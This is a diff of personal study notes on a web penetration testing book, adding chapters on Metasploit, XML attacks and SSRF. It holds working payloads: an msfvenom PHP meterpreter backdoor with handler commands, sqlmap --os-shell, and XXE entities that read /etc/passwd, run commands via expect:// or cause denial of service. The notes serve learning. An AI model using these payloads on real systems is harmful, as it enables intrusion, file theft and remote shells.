@@ -1,5 +1,5 @@
-# Mastering Modern Web Penetration Testing notes
-> Prakhar Prasad
+# Mastering Modern Web Penetration Testing (notes)
+Prakhar Prasad
 
 ## Ch1 - Common Security Protocols
 
@@ -177,16 +177,16 @@ JSON
     - `-u URL --data="params" -p param_to_test`
     - Save the request and `sqlmap.py -r request.txt -p param_to_test`
 - Cookies `--cookie="PHPSESSID=AAAAAAAAAAAAAAAAAAAAAAAA"`
-- HTTP auth: `--auth-cred and --auth-type`
-- Database shell: `--sql-shell`
-- Command shell: `--os-shell` or `--os-cmd "uname -a"`
-- Tamper: `--tamper charencode -v3`
-- Proxy: `--proxy="https://proxy.example.com:8080"`
-- Tor: `--tor`
+- HTTP auth `--auth-cred and --auth-type`
+- Database shell `--sql-shell`
+- Command shell `--os-shell` or `--os-cmd "uname -a"`
+- Tamper `--tamper charencode -v3`
+- Proxy `--proxy="https://proxy.example.com:8080"`
+- Tor `--tor`
 
 # Ch6 - File upload
 
-PHP functions used from os command execution
+PHP functions used for os command execution
 - system
 - shell_exec
 - passthru
@@ -257,3 +257,188 @@ Further reading
 - http://soroush.secproject.com/downloadable/iis-semicolon-report.pdf
 
 ## Ch7 - Metasploit and web
+
+Metasploit modules
+- Auxiliary: scanning, fuzzing
+- Exploit: return a shell
+- Encoder: cloak, obfuscate
+- Payload: payload after exploit
+- Others: Nops, post-exploitation
+
+Metasploit for web
+```
+msf > use auxiliary/scanner/http/
+msf > use auxiliary/scanner/http/brute_dirs
+msf > use auxiliary/scanner/http/dir_scanner
+msf > use auxiliary/scanner/http/files_dir
+msf > show options
+msf > set THREADS 10
+msf > set RHOSTS VICTIM_IP
+...
+```
+
+Automated scanner
+```
+msf > load wmap
+msf > wmap_sites –a protocol://host:port
+msf > wmap_sites –l
+msf > wmap_targets –t protocol://host:port
+msf > wmap_targets –l
+msf > wmap_run –t
+msf > wmap_run –e
+```
+
+Web backdoor
+```
+$ msfvenom -l payloads
+$ msfvenom -p php/meterpreter/bind_tcp --list-options
+$ msfvenom -p php/meterpreter/bind_tcp LPORT=60000 > /root/msf/php-msf.php
+$ msfconsole
+msf > use exploit/multi/handler
+msf exploit(handler) > set PAYLOAD php/meterpreter/bind_tcp
+msf exploit(handler) > set RHOST VICTIM_IP
+msf exploit(handler) > set LPORT 60000
+```
+
+If the session keeps ending, create a platform specific backdoor.
+
+## Ch8 - XML attacks
+
+XML Basics
+- An XML document must contain only one root element.
+- An attribute must always be quoted with either single quotes or double quotes.
+- An XML DTD is document which is used to validate an XML document for certain criteria.
+- An XML DTD can be internal or external. `<!DOCTYPE student SYSTEM "student.dtd">`
+
+XML entities
+- An XML entity is a representation of some information.
+- A predefined entity is generally used to represent markup characters.
+- We can define our own entities which will reference some information internally or externally.
+
+Internal
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE student [
+	<!ELEMENT student (#PCDATA)>
+	<!ENTITY name "James Jones">
+]>
+<student>&name;</student>
+```
+
+External
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE student [
+	<!ELEMENT student (#PCDATA)>
+	<!ENTITY sname SYSTEM "https://abhaynayar.com/external.xml">
+]>
+<student>&sname;</student>
+```
+
+XXE attack
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE student [
+<!ENTITY oops SYSTEM "file:///etc/passwd">
+]>
+<student>
+<name>&oops;</name>
+</student>
+```
+
+- In some environments, it is possible to get a directory listing with the `file://` handler: `<!ENTITY oops SYSTEM "file:///etc/ ">`
+- PHP base64 filter conversion
+```
+<!DOCTYPE student [
+	<!ENTITY pwn SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+]>
+<student>
+<name>&pwn;</name>
+</student>
+```
+
+SSRF through XXE
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE student [
+	<!ENTITY oops SYSTEM "http://scanme.nmap.org:20/">
+]>
+<student>
+<name>&oops;</name>
+</student>
+```
+
+RCE through XXE
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE name [
+	<!ENTITY rce SYSTEM "expect://id">
+]>
+<student>
+<name>&rce;</name>
+</student>
+```
+
+DoS through XXE
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE student [
+	<!ENTITY oops SYSTEM "file:///dev/random">
+]>
+<student>
+<name>&oops;</name>
+</student>
+```
+
+XML quadratic blowup
+
+```
+<?xml version="1.0"?>
+<!DOCTYPE student [
+<!ENTITY x "xxxxxxxxxxxxxxxxx..."> (50,000-100,000)
+]>
+<student>&x;&x;&x;&x;&x;&x;&x;&x;&x;...</student>
+```
+
+## Ch9 - Emerging attack vectors
+
+### SSRF
+https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit
+
+- Port scanning: `http://scanme.nmap.org:1234/`
+- `file://` to read files from the vulnerable server
+- Protocol handlers:
+	- SSH: `scp://`,`sftp://`
+	- POP3
+	- IMAP
+	- SMTP
+	- FTP
+	- DICT
+	- GOPHER
+	- TFTP
+	- JAR
+	- LDAP
+
+### IDOR
+
+Read case studies and reports.
+
+### DOM Clobbering
+
+Run [this](code/dom-clobbering.html) code in your browser and take a look at the console.
+
+### Relative Path Overwrite
+
+- If you have an import in `example.com/path/index.php` for relative path `style.css` your css will be loaded from `example.com/path/style.css`
+- But due to server side language flexibility, even this URL acts like the first: `example.com/path/index.php/this/works`
+- For that reason, the relative path now becomes `example.com/path/index.php/this/works/style.css` and will be ignored.
+- We can find endpoints where we control the content of the document and inject code such as in search pages.
+
+- Sources
+    - https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities
+    - http://www.thespanner.co.uk/2014/03/21/rpo/
+
